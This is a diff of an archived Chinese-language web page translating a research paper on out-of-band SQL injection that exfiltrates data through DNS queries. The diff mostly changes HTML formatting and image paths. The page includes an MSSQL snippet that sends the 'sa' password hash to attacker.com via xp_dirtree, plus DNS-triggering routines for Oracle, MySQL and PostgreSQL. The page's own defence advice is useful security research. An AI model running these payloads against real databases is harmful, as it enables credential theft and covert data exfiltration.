@@ -3,14 +3,14 @@
 			<head>
 			     <title>在SQL注入中使用DNS获取数据 - Knight</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			</head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style><link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/tips/5283">http://drops.wooyun.org/tips/5283</a></h1>
 				
       <p>
-        <h1>0x00 前言</h1>
+        </p><h1>0x00 前言</h1>
 
-<hr />
+<hr>
 
 <p>原文地址: http://arxiv.org/ftp/arxiv/papers/1303/1303.3047.pdf</p>
 
@@ -22,7 +22,7 @@
 
 <h1>0x01 介绍</h1>
 
-<hr />
+<hr>
 
 <p>渗出是一个军事术语，指的是通过隐蔽手段从敌人的领土内部盗取资产。如今它在计算机上有一个绝佳的用法，指的是非法从一个系统中提取数据。从域名服务器（DNS）中提取数据的方法被认为是最隐蔽的渗出方法。这种方法甚至可以通过一系列的信任主机以外的内部和外部域名服务器进行域名查询而用于没有公共网络连接的系统。</p>
 
@@ -36,7 +36,7 @@
 
 <h1>0x02 技术分类</h1>
 
-<hr />
+<hr>
 
 <p>根据用于数据检索的传输信道，SQLi可分为三个独立的类别：inband, inference（推理） 和out-of-band。</p>
 
@@ -52,7 +52,7 @@
 
 <h1>0x03 DNS解析</h1>
 
-<hr />
+<hr>
 
 <p>当一个客户端需要查找程序中使用的网络名时，它会查询DNS服务器。DNS查询有许多不同的解析方式：</p>
 
@@ -62,7 +62,7 @@
 <li><p>DNS服务器也可以转发查询给代表所请求的客户端的其他DNS服务器以全面解析名称，然后将回应发送回客户端 - 这个过程被称为递归。</p></li>
 </ul>
 
-<p><img src="http://static.wooyun.org/drops/20150323/2015032302535285631.png" alt="enter image description here" /></p>
+<p><img src="../images_result/images/2015032302535285631.png" alt="enter image description here"></p>
 
 <p>例如，使用递归过程解析名称test.example.com。这种情况发生于DNS服务器和客户端都是第一次启动且没有能用来解析域名查询的本地缓存信息。此外，假设客户端发起的域名查询是一个本地没有其配置区域信息的域名。</p>
 
@@ -74,7 +74,7 @@
 
 <h1>0x04 引发DNS请求</h1>
 
-<hr />
+<hr>
 
 <p>成功利用DNS从有漏洞的数据库中渗出数据的前提条件是DBMS中有可用的能直接或间接引发DNS解析过程的子程序。 然后这类的子程序被攻击者利用，作为攻击的媒介。</p>
 
@@ -82,7 +82,7 @@
 
 <h2> 4.1 Microsoft SQL Server</h2>
 
-<hr />
+<hr>
 
 <p>扩展存储程序是一个直接运行在微软的地址空间库SQL服务器（MSSQL）的动态链接。有几个未被公开说明的扩展存储程序对于实现本文的目的特别有用的。</p>
 
@@ -107,7 +107,7 @@
 
 <p>4.1.2 master..xp_fileexist</p>
 
-<p>扩展存储程序master..xp&#95;fileexist（）用于确定一个特定的文件是否存在于硬盘： xp&#95;fileexist '<filepath>' 例如，要检查boot.ini文件是否存在于磁盘C 运行:</p>
+<p>扩展存储程序master..xp&#95;fileexist（）用于确定一个特定的文件是否存在于硬盘： xp&#95;fileexist '<filepath>' 例如，要检查boot.ini文件是否存在于磁盘C 运行:</filepath></p>
 
 <pre><code> EXEC master..xp_fileexist 'C:\boot.ini';
 </code></pre>
@@ -132,14 +132,14 @@
 DECLARE @host varchar(1024);     
 
 SELECT @host=(SELECT TOP 1 master.dbo.fn_varbintohexstr(password_hash) FROM sys.sql_logins WHERE name='sa')+'.attacker.com';
- EXEC('master..xp_dirtree "\\<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="bf9894ffd7d0cccb">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>+'\foobar$"');
+ EXEC('master..xp_dirtree "\\<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="bf9894ffd7d0cccb">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>+'\foobar$"');
 </code></pre>
 
 <p>这种预先计算的形式被使用，因为扩展存储程序不接受带有参数的子查询。因而使用临时变量存储SQL查询的结果。</p>
 
 <h2>4.2 Oracle </h2>
 
-<hr />
+<hr>
 
 <p>Oracle提供的PL/ SQL包被捆绑在它的Oracle数据库服务器来扩展数据库功能。为了实现本文的目的，其中几个用于网络接入的包让人特别感兴趣。</p>
 
@@ -159,7 +159,7 @@ SELECT @host=(SELECT TOP 1 master.dbo.fn_varbintohexstr(password_hash) FROM sys.
 
 <p>4.2.2 UTL_HTTP.REQUEST</p>
 
-<p>UTL&#95;HTTP包用于从SQL和PL/SQL中标注出HTTP。 它的程序REQUEST()回从给定的地址检索到的第1-2000字节的数据： UTL&#95;HTTP.REQUEST('<url>')</p>
+<p>UTL&#95;HTTP包用于从SQL和PL/SQL中标注出HTTP。 它的程序REQUEST()回从给定的地址检索到的第1-2000字节的数据： UTL&#95;HTTP.REQUEST('<url>')</url></p>
 
 <p>例如，为了获得http://test.example.com/index.php页面的前两千字节的数据，运行：</p>
 
@@ -168,7 +168,7 @@ SELECT @host=(SELECT TOP 1 master.dbo.fn_varbintohexstr(password_hash) FROM sys.
 
 <p>4.2.3 HTTPURITYPE.GETCLOB</p>
 
-<p>HTTPURITYPE类的实例方法GETCLOB()返回从给定地址中检索到的CLOB（Character Large Object） HTTPURITYPE('<url>').GETCLOB()</p>
+<p>HTTPURITYPE类的实例方法GETCLOB()返回从给定地址中检索到的CLOB（Character Large Object） HTTPURITYPE('<url>').GETCLOB()</url></p>
 
 <p>例如，从页面http://test.example.com/index.php开始内容检索 运行：</p>
 
@@ -177,7 +177,7 @@ SELECT @host=(SELECT TOP 1 master.dbo.fn_varbintohexstr(password_hash) FROM sys.
 
 <p>4.2.4 DBMS_LDAP.INIT</p>
 
-<p>DBMS&#95;LDAP包使得PL/SQL程序员能够访问轻量级目录访问协议（LDAP）服务器。它的程序INIT()用于初始化与LDAP服务器的会话： DBMS&#95;LDAP.INIT(('<host>',<port>)</p>
+<p>DBMS&#95;LDAP包使得PL/SQL程序员能够访问轻量级目录访问协议（LDAP）服务器。它的程序INIT()用于初始化与LDAP服务器的会话： DBMS&#95;LDAP.INIT(('<host>',<port>)</port></host></p>
 
 <p>例如：初始化与主机test.example.com的连接 运行：</p>
 
@@ -195,11 +195,11 @@ SELECT @host=(SELECT TOP 1 master.dbo.fn_varbintohexstr(password_hash) FROM sys.
 
 <h2>4.3 MySQL </h2>
 
-<hr />
+<hr>
 
 <p>4.3.1 LOAD_FILE</p>
 
-<p>MySQL的函数LOAD&#95;FILE()读取文件内容并将其作为字符串返回： LOAD&#95;FILE('<filepath>')</p>
+<p>MySQL的函数LOAD&#95;FILE()读取文件内容并将其作为字符串返回： LOAD&#95;FILE('<filepath>')</filepath></p>
 
 <p>例如，要获取C:\Windows\system.ini文件的内容 运行：</p>
 
@@ -215,7 +215,7 @@ SELECT @host=(SELECT TOP 1 master.dbo.fn_varbintohexstr(password_hash) FROM sys.
 
 <h2>4.4 PostgreSQL</h2>
 
-<hr />
+<hr>
 
 <p> 4.4.1 COPY</p>
 
@@ -261,7 +261,7 @@ $$ LANGUAGE plpgsql SECURITY DEFINER;
 
 <h1>0x05 实施</h1>
 
-<hr />
+<hr>
 
 <p>如前所述，我选择的工具SQL注入工具是SqlMap，主要是因为本文的作者也是它的开发者之一，并升级它使其支持DNS渗出。新的命令行选项--dns-domain已经被添加用于运行新的程序流程。有了它，用户可以打开DNS渗出的支持，并且通知SqlMap所有被引发DNS解析请求应指向给定域（例如--dns-domain=attacker.com）。</p>
 
@@ -277,11 +277,11 @@ $$ LANGUAGE plpgsql SECURITY DEFINER;
 
 <p>这种方式使得最终一切非单词字符都能被保留。此外，表示较长的SQL查询结果的十六进制被分割。这是必须做的，因为整个域名内的节点标签（如.example.）被限制在63个字符长度大小。</p>
 
-<p><img src="http://static.wooyun.org/drops/20150323/2015032302535229201.png" alt="enter image description here" /></p>
+<p><img src="../images_result/images/2015032302535229201.png" alt="enter image description here"></p>
 
 <h1>0x06 实验设置和结果</h1>
 
-<hr />
+<hr>
 
 <p>为了进行实验需要配置和使用三台机器：</p>
 
@@ -344,7 +344,7 @@ $$ LANGUAGE plpgsql SECURITY DEFINER;
 
 <h1>0x07 讨论</h1>
 
-<hr />
+<hr>
 
 <p>从表1中给出的结果可以看出，inband技术（union和error-based）是最快的方法，而inference技术（布尔型盲注和基于时间的盲注）是最慢的。</p>
 
@@ -362,13 +362,13 @@ $$ LANGUAGE plpgsql SECURITY DEFINER;
 
 <p>总而言之，DNS渗出技术的数值看起来更好一点，使其成为inference方法的一个完美的替代品。</p>
 
-<p><img src="http://static.wooyun.org/drops/20150323/2015032302535223898.png" alt="enter image description here" /></p>
+<p><img src="../images_result/images/2015032302535223898.png" alt="enter image description here"></p>
 
 <p>图3： 捕获到的SqlMap使用DNS渗出时的流量</p>
 
 <h1>0x08 防范技巧</h1>
 
-<hr />
+<hr>
 
 <p> 为了预防所本文描述的攻击，首先要避免SQLI具有最高的优先权。</p>
 
@@ -404,7 +404,7 @@ $$ LANGUAGE plpgsql SECURITY DEFINER;
 
 <h1>0x09 参考文献</h1>
 
-<hr />
+<hr>
 
 <p>1 sqlmap – automatic SQL injection and database takeover tool, Bernardo Damele A. G., Miroslav Štampar, http://www.sqlmap.org/ </p>
 
@@ -456,7 +456,7 @@ $$ LANGUAGE plpgsql SECURITY DEFINER;
 
 <p>25 Detecting DNS Tunnels Using Character Frequency Analysis, Kenton Born, Dr. David Gustafson, Kansas State University, April 2010,http://arxiv.org/pdf/1004.4358.pdf</p>
 
-<p>26 Finding Malicious Activity in Bulk DNS Data, EdStoner, Carnegie Mellon University, 2010, www.cert.org/archive/pdf/research-rpt2009/stoner-mal-act.pdf</p>      </p>
+<p>26 Finding Malicious Activity in Bulk DNS Data, EdStoner, Carnegie Mellon University, 2010, www.cert.org/archive/pdf/research-rpt2009/stoner-mal-act.pdf</p>      <p></p>
     
 			</body>
 		</html>
